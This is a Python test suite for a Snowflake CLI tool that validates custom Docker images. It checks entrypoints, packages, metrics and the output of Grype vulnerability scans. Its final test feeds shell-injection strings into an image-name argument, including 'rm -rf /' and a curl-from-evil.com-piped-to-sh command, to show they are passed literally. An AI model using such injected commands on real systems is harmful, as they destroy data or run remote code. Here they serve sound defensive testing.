# Copyright (c) 2024 Snowflake Inc.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import json
import subprocess
from pathlib import Path
from unittest import mock

import pytest
from click import ClickException
from snowflake.cli._plugins.custom_images.manager import CustomImageManager
from snowflake.cli._plugins.custom_images.metrics import CustomImageCounterField
from snowflake.cli.api.cli_global_context import fork_cli_context, get_cli_context

from tests.custom_images.test_helpers import (
    create_mock_side_effect,
    make_docker_inspect_response,
    make_pip_list_response,
)


class TestCustomImageManager:
    """Tests for CustomImageManager validation."""

    @pytest.fixture(autouse=True)
    def reset_cli_context(self):
        """Reset the CLI context before each test to get fresh metrics."""
        with fork_cli_context():
            yield

    @pytest.fixture
    def config_path(self, tmp_path) -> Path:
        """Create a config file for testing."""
        config_content = """
version: "1.0"

checks:
  entrypoint: "/usr/local/bin/entrypoint.sh"
  environment_variables:
    - name: DASHBOARD_PORT
      value: "12003"
  python_packages:
    - snowflake-ml-python
    - ray
  dependency_health:
    enabled: true
    ignore_patterns:
      - jupyter-lsp

notebook_checks:
  required_scripts:
    - start_nbctl.sh
"""
        config_file = tmp_path / "test_config.yaml"
        config_file.write_text(config_content)
        return config_file

    @mock.patch("snowflake.cli._plugins.custom_images.manager.subprocess.run")
    def test_docker_not_installed(self, mock_run, config_path):
        """Test error when Docker is not installed."""
        mock_run.side_effect = FileNotFoundError()
        manager = CustomImageManager(config_path=config_path)

        with pytest.raises(ClickException) as exc_info:
            manager.validate("test-image:latest")

        assert "Docker is not installed" in str(exc_info.value)

    @mock.patch("snowflake.cli._plugins.custom_images.manager.subprocess.run")
    def test_image_not_found(self, mock_run, config_path):
        """Test when image does not exist."""
        mock_run.return_value = mock.Mock(
            returncode=1, stdout="", stderr="No such image"
        )
        manager = CustomImageManager(config_path=config_path)

        report, _ = manager.validate("nonexistent:latest")

        assert not report.all_passed
        assert any(
            r.check_name == "image_exists" and not r.passed for r in report.results
        )
        metrics = get_cli_context().metrics
        assert metrics.get_counter(CustomImageCounterField.CUSTOM_IMAGE_VALIDATE) == 1
        assert (
            metrics.get_counter(CustomImageCounterField.CUSTOM_IMAGE_VALIDATE_FAILED)
            == 1
        )
        assert (
            metrics.get_counter(
                CustomImageCounterField.CUSTOM_IMAGE_VALIDATE_FAIL_IMAGE_NOT_FOUND
            )
            == 1
        )

    @mock.patch("snowflake.cli._plugins.custom_images.manager.subprocess.run")
    @pytest.mark.parametrize(
        "entrypoint,env_vars,packages,expected_pass",
        [
            # All correct - should pass
            (
                ["/usr/local/bin/entrypoint.sh"],
                ["DASHBOARD_PORT=12003"],
                [
                    {"name": "snowflake-ml-python", "version": "1.0"},
                    {"name": "ray", "version": "2.0"},
                ],
                True,
            ),
            # Package name with underscore (normalization) - should pass
            (
                ["/usr/local/bin/entrypoint.sh"],
                ["DASHBOARD_PORT=12003"],
                [
                    {"name": "snowflake_ml_python", "version": "1.0"},
                    {"name": "ray", "version": "2.0"},
                ],
                True,
            ),
            # Wrong entrypoint - should fail
            (
                ["/wrong/entrypoint.sh"],
                ["DASHBOARD_PORT=12003"],
                [
                    {"name": "snowflake-ml-python", "version": "1.0"},
                    {"name": "ray", "version": "2.0"},
                ],
                False,
            ),
            # Missing env var - should fail
            (
                ["/usr/local/bin/entrypoint.sh"],
                [],
                [
                    {"name": "snowflake-ml-python", "version": "1.0"},
                    {"name": "ray", "version": "2.0"},
                ],
                False,
            ),
            # Missing package - should fail
            (
                ["/usr/local/bin/entrypoint.sh"],
                ["DASHBOARD_PORT=12003"],
                [{"name": "snowflake-ml-python", "version": "1.0"}],
                False,
            ),
            # Entrypoint is None (no entrypoint configured) - should fail
            (
                None,
                ["DASHBOARD_PORT=12003"],
                [
                    {"name": "snowflake-ml-python", "version": "1.0"},
                    {"name": "ray", "version": "2.0"},
                ],
                False,
            ),
            # Entrypoint is empty list - should fail
            (
                [],
                ["DASHBOARD_PORT=12003"],
                [
                    {"name": "snowflake-ml-python", "version": "1.0"},
                    {"name": "ray", "version": "2.0"},
                ],
                False,
            ),
        ],
    )
    def test_validation_scenarios(
        self, mock_run, config_path, entrypoint, env_vars, packages, expected_pass
    ):
        """Test various validation scenarios including package name normalization."""
        inspect_response = make_docker_inspect_response(
            entrypoint=entrypoint, env_vars=env_vars
        )
        pip_list = make_pip_list_response(packages)
        mock_run.side_effect = create_mock_side_effect(
            inspect_response=inspect_response,
            pip_list_response=pip_list,
        )
        manager = CustomImageManager(config_path=config_path)

        report, _ = manager.validate("test-image:latest")

        assert report.all_passed == expected_pass
        m = get_cli_context().metrics
        assert m.get_counter(CustomImageCounterField.CUSTOM_IMAGE_VALIDATE) == 1
        assert m.get_counter(
            CustomImageCounterField.CUSTOM_IMAGE_VALIDATE_FAILED
        ) == int(not expected_pass)

    @mock.patch("snowflake.cli._plugins.custom_images.manager.subprocess.run")
    def test_grype_not_installed(self, mock_run, config_path):
        """Test error when Grype is not installed and vulnerability scan is requested."""
        inspect_response = make_docker_inspect_response(
            entrypoint=["/usr/local/bin/entrypoint.sh"],
            env_vars=["DASHBOARD_PORT=12003"],
        )
        pip_list = make_pip_list_response(
            [
                {"name": "snowflake-ml-python", "version": "1.0"},
                {"name": "ray", "version": "2.0"},
            ]
        )
        mock_run.side_effect = create_mock_side_effect(
            inspect_response=inspect_response,
            pip_list_response=pip_list,
            grype_error=FileNotFoundError(),
        )
        manager = CustomImageManager(config_path=config_path)

        with pytest.raises(ClickException) as exc_info:
            manager.validate("test-image:latest", scan_vulnerabilities=True)

        assert "Grype is required for vulnerability scanning" in str(exc_info.value)

    @mock.patch("snowflake.cli._plugins.custom_images.manager.subprocess.run")
    def test_checks_skipped_when_not_configured(self, mock_run, tmp_path):
        """Test that checks are skipped when not in config."""
        config_content = """
version: "1.0"

checks:
  entrypoint: "/usr/local/bin/entrypoint.sh"
"""
        config_file = tmp_path / "minimal_config.yaml"
        config_file.write_text(config_content)

        inspect_response = make_docker_inspect_response(
            entrypoint=["/usr/local/bin/entrypoint.sh"]
        )
        mock_run.side_effect = create_mock_side_effect(
            inspect_response=inspect_response
        )
        manager = CustomImageManager(config_path=config_file)

        report, _ = manager.validate("test-image:latest")

        check_names = [r.check_name for r in report.results]
        assert "entrypoint" in check_names
        assert "dependency_health" not in check_names
        assert "vulnerability_scan" not in check_names
        m = get_cli_context().metrics
        assert m.get_counter(CustomImageCounterField.CUSTOM_IMAGE_VALIDATE) == 1
        assert m.get_counter(CustomImageCounterField.CUSTOM_IMAGE_VALIDATE_FAILED) == 0

    @mock.patch("snowflake.cli._plugins.custom_images.manager.subprocess.run")
    def test_notebook_ready_when_script_present(self, mock_run, config_path):
        """Test readiness reports both ML Jobs and Notebooks when all checks pass."""
        inspect_response = make_docker_inspect_response(
            entrypoint=["/usr/local/bin/entrypoint.sh"],
            env_vars=["DASHBOARD_PORT=12003"],
        )
        pip_list = make_pip_list_response(
            [
                {"name": "snowflake-ml-python", "version": "1.0"},
                {"name": "ray", "version": "2.0"},
            ]
        )
        mock_run.side_effect = create_mock_side_effect(
            inspect_response=inspect_response,
            pip_list_response=pip_list,
        )
        manager = CustomImageManager(config_path=config_path)

        report, output = manager.validate("test-image:latest")

        script_result = next(
            r for r in report.results if r.check_name == "script_start_nbctl.sh"
        )
        assert script_result.passed
        assert "Ready for: ML Jobs, Notebooks" in output
        m = get_cli_context().metrics
        assert m.get_counter(CustomImageCounterField.CUSTOM_IMAGE_VALIDATE) == 1
        assert m.get_counter(CustomImageCounterField.CUSTOM_IMAGE_VALIDATE_FAILED) == 0

    @mock.patch("snowflake.cli._plugins.custom_images.manager.subprocess.run")
    def test_ml_job_only_when_script_missing(self, mock_run, config_path):
        """Test readiness reports ML Jobs only when notebook script is missing."""
        inspect_response = make_docker_inspect_response(
            entrypoint=["/usr/local/bin/entrypoint.sh"],
            env_vars=["DASHBOARD_PORT=12003"],
        )
        pip_list = make_pip_list_response(
            [
                {"name": "snowflake-ml-python", "version": "1.0"},
                {"name": "ray", "version": "2.0"},
            ]
        )
        mock_run.side_effect = create_mock_side_effect(
            inspect_response=inspect_response,
            pip_list_response=pip_list,
            missing_scripts={"start_nbctl.sh"},
        )
        manager = CustomImageManager(config_path=config_path)

        report, output = manager.validate("test-image:latest")

        script_result = next(
            r for r in report.results if r.check_name == "script_start_nbctl.sh"
        )
        assert not script_result.passed
        assert "Ready for: ML Jobs" in output
        assert "Notebooks" not in output
        m = get_cli_context().metrics
        assert m.get_counter(CustomImageCounterField.CUSTOM_IMAGE_VALIDATE) == 1
        assert m.get_counter(CustomImageCounterField.CUSTOM_IMAGE_VALIDATE_FAILED) == 1
        assert (
            m.get_counter(
                CustomImageCounterField.CUSTOM_IMAGE_VALIDATE_FAIL_REQUIRED_SCRIPTS
            )
            == 1
        )

    @mock.patch("snowflake.cli._plugins.custom_images.manager.subprocess.run")
    def test_required_scripts_empty_list(self, mock_run, tmp_path):
        """Test that an empty required_scripts list is treated as no notebook checks."""
        config_content = """
version: "1.0"

checks:
  entrypoint: "/usr/local/bin/entrypoint.sh"
  environment_variables:
    - name: DASHBOARD_PORT
      value: "12003"
  python_packages:
    - snowflake-ml-python
    - ray

notebook_checks:
  required_scripts: []
"""
        config_file = tmp_path / "empty_scripts_config.yaml"
        config_file.write_text(config_content)

        inspect_response = make_docker_inspect_response(
            entrypoint=["/usr/local/bin/entrypoint.sh"],
            env_vars=["DASHBOARD_PORT=12003"],
        )
        pip_list = make_pip_list_response(
            [
                {"name": "snowflake-ml-python", "version": "1.0"},
                {"name": "ray", "version": "2.0"},
            ]
        )
        mock_run.side_effect = create_mock_side_effect(
            inspect_response=inspect_response,
            pip_list_response=pip_list,
        )
        manager = CustomImageManager(config_path=config_file)

        report, output = manager.validate("test-image:latest")

        check_names = [r.check_name for r in report.results]
        assert not any(name.startswith("script_") for name in check_names)
        assert "Ready for: ML Jobs, Notebooks" in output

    @mock.patch("snowflake.cli._plugins.custom_images.manager.subprocess.run")
    def test_metrics_entrypoint_failure(self, mock_run, config_path):
        """Entrypoint mismatch: failed=1, fail_entrypoint=1."""
        inspect_response = make_docker_inspect_response(
            entrypoint=["/wrong/entrypoint.sh"],
            env_vars=["DASHBOARD_PORT=12003"],
        )
        mock_run.side_effect = create_mock_side_effect(
            inspect_response=inspect_response
        )
        manager = CustomImageManager(config_path=config_path)
        manager.validate("test-image:latest")

        m = get_cli_context().metrics
        assert m.get_counter(CustomImageCounterField.CUSTOM_IMAGE_VALIDATE) == 1
        assert m.get_counter(CustomImageCounterField.CUSTOM_IMAGE_VALIDATE_FAILED) == 1
        assert (
            m.get_counter(CustomImageCounterField.CUSTOM_IMAGE_VALIDATE_FAIL_ENTRYPOINT)
            == 1
        )

    @mock.patch("snowflake.cli._plugins.custom_images.manager.subprocess.run")
    def test_metrics_env_var_failure(self, mock_run, config_path):
        """Missing env var: failed=1, fail_env_vars=1."""
        inspect_response = make_docker_inspect_response(
            entrypoint=["/usr/local/bin/entrypoint.sh"],
            env_vars=[],
        )
        pip_list = make_pip_list_response(
            [
                {"name": "snowflake-ml-python", "version": "1.0"},
                {"name": "ray", "version": "2.0"},
            ]
        )
        mock_run.side_effect = create_mock_side_effect(
            inspect_response=inspect_response,
            pip_list_response=pip_list,
        )
        manager = CustomImageManager(config_path=config_path)
        manager.validate("test-image:latest")

        m = get_cli_context().metrics
        assert m.get_counter(CustomImageCounterField.CUSTOM_IMAGE_VALIDATE) == 1
        assert m.get_counter(CustomImageCounterField.CUSTOM_IMAGE_VALIDATE_FAILED) == 1
        assert (
            m.get_counter(CustomImageCounterField.CUSTOM_IMAGE_VALIDATE_FAIL_ENV_VARS)
            == 1
        )
        assert (
            m.get_counter(CustomImageCounterField.CUSTOM_IMAGE_VALIDATE_FAIL_ENTRYPOINT)
            == 0
        )

    @mock.patch("snowflake.cli._plugins.custom_images.manager.subprocess.run")
    def test_metrics_python_package_failure(self, mock_run, config_path):
        """Missing package: failed=1, fail_python_packages=1."""
        inspect_response = make_docker_inspect_response(
            entrypoint=["/usr/local/bin/entrypoint.sh"],
            env_vars=["DASHBOARD_PORT=12003"],
        )
        pip_list = make_pip_list_response(
            [{"name": "snowflake-ml-python", "version": "1.0"}]  # ray missing
        )
        mock_run.side_effect = create_mock_side_effect(
            inspect_response=inspect_response,
            pip_list_response=pip_list,
        )
        manager = CustomImageManager(config_path=config_path)
        manager.validate("test-image:latest")

        m = get_cli_context().metrics
        assert m.get_counter(CustomImageCounterField.CUSTOM_IMAGE_VALIDATE) == 1
        assert m.get_counter(CustomImageCounterField.CUSTOM_IMAGE_VALIDATE_FAILED) == 1
        assert (
            m.get_counter(
                CustomImageCounterField.CUSTOM_IMAGE_VALIDATE_FAIL_PYTHON_PACKAGES
            )
            == 1
        )
        assert (
            m.get_counter(CustomImageCounterField.CUSTOM_IMAGE_VALIDATE_FAIL_ENV_VARS)
            == 0
        )

    @mock.patch("snowflake.cli._plugins.custom_images.manager.subprocess.run")
    def test_metrics_dependency_health_failure(self, mock_run, config_path):
        """Broken dependencies: failed=1, fail_dependency_health=1."""
        inspect_response = make_docker_inspect_response(
            entrypoint=["/usr/local/bin/entrypoint.sh"],
            env_vars=["DASHBOARD_PORT=12003"],
        )
        pip_list = make_pip_list_response(
            [
                {"name": "snowflake-ml-python", "version": "1.0"},
                {"name": "ray", "version": "2.0"},
            ]
        )
        mock_run.side_effect = create_mock_side_effect(
            inspect_response=inspect_response,
            pip_list_response=pip_list,
            pip_check_result=(1, "broken-pkg 1.0 requires missing-pkg"),
        )
        manager = CustomImageManager(config_path=config_path)
        manager.validate("test-image:latest")

        m = get_cli_context().metrics
        assert m.get_counter(CustomImageCounterField.CUSTOM_IMAGE_VALIDATE) == 1
        assert m.get_counter(CustomImageCounterField.CUSTOM_IMAGE_VALIDATE_FAILED) == 1
        assert (
            m.get_counter(
                CustomImageCounterField.CUSTOM_IMAGE_VALIDATE_FAIL_DEPENDENCY_HEALTH
            )
            == 1
        )
        assert (
            m.get_counter(
                CustomImageCounterField.CUSTOM_IMAGE_VALIDATE_FAIL_PYTHON_PACKAGES
            )
            == 0
        )


@mock.patch("snowflake.cli._plugins.custom_images.manager.subprocess.run")
def test_vulnerability_scan_failure_shows_table(mock_run, tmp_path):
    """On Grype failure, message is a readable table, not raw JSON."""
    config_file = tmp_path / "cfg.yaml"
    config_file.write_text(
        """
version: "1.0"
checks:
  entrypoint: "/usr/local/bin/entrypoint.sh"
"""
    )
    grype_out = json.dumps(
        {
            "matches": [
                {
                    "vulnerability": {"id": "CVE-2025-TEST", "severity": "High"},
                    "artifact": {
                        "name": "badlib",
                        "version": "1.2.3",
                        "type": "python",
                    },
                },
                {
                    "vulnerability": {"id": "CVE-2025-REL", "severity": "Medium"},
                    "relatedVulnerabilities": [
                        {"id": "CVE-2025-REL", "severity": "Critical"},
                    ],
                    "artifact": {
                        "name": "curl",
                        "version": "8.0.0",
                        "type": "deb",
                    },
                },
                {
                    "vulnerability": {"id": "CVE-LOW", "severity": "Low"},
                    "artifact": {"name": "skip-me", "version": "1", "type": "rpm"},
                },
            ]
        }
    )

    mock_run.side_effect = create_mock_side_effect(
        inspect_response=make_docker_inspect_response(
            entrypoint=["/usr/local/bin/entrypoint.sh"]
        ),
        grype_result=(1, grype_out),
    )
    manager = CustomImageManager(config_path=config_file)
    report, _ = manager.validate("img:latest", scan_vulnerabilities=True)
    vuln = next(r for r in report.results if r.check_name == "vulnerability_scan")
    assert not vuln.passed
    assert "badlib" in vuln.message
    assert "1.2.3" in vuln.message
    assert "python" in vuln.message
    assert "CVE-2025-TEST" in vuln.message
    assert "High" in vuln.message
    assert "curl" in vuln.message and "Critical" in vuln.message
    assert "skip-me" not in vuln.message
    assert '"matches"' not in vuln.message


@pytest.mark.parametrize(
    "malicious_name",
    [
        "legit; rm -rf /",
        "img:latest && curl evil.com | sh",
        "$(whoami)",
        "img`id`",
        'img" --some-flag',
    ],
)
def test_subprocess_list_passes_malicious_name_literally(malicious_name):
    """Shell metacharacters in image names are passed literally, not interpreted."""
    import sys

    result = subprocess.run(
        [sys.executable, "-c", "import sys; print(sys.argv[1])", malicious_name],
        capture_output=True,
        text=True,
    )
    assert result.returncode == 0
    assert result.stdout.strip() == malicious_name
